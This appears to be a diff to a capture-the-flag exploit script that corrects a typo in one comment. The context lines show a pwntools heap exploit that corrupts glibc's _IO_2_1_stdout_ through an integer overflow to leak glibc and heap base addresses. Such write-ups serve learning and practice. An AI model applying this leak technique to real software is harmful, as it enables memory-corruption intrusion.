@@ -26,7 +26,7 @@ p = gdb.debug('./chall_patched', '''
 # Stage 1: leak glibc base address and heap base address
 # malloc a chunk whose size is greater than 0x20000 bytes to make it go to memory-mapped region (page aligned automatically), which has a fixed offset from glibc base address
 p.sendlineafter(b"> ", b'r 1000 1000')  # mmaped_base_addr+0x10 malloced (0xf5000), heap_base_addr+0x2a0 freed (0x1a0)
-# attack _IO_2_1_stdout_ in glibc througn integer overflow to use it as read primitive to leak a bunch of data with a customized range
+# attack _IO_2_1_stdout_ in glibc through integer overflow to use it as read primitive to leak a bunch of data with a customized range
 p.sendlineafter(b"> ", f"p 0 {0x2fc5b0+1} {format(0x18, 'x').zfill(2)}".encode())  # ensure value of _IO_2_1_stdout_->_flags is 0xfbad1887
 p.sendlineafter(b"> ", f"p 0 {0x2fc5d0+1} {format(0x00, 'x').zfill(2)}".encode())  # ensure last second significant byte of _IO_2_1_stdout_->_IO_write_base is \x00
 # a large amount of bytes from *_IO_write_base=(_IO_2_1_stdout_+0x83)&0xffffffffffff00ff to *_IO_write_ptr=_IO_2_1_stdout_+0x83 are leaked out, containing a lot of useful information
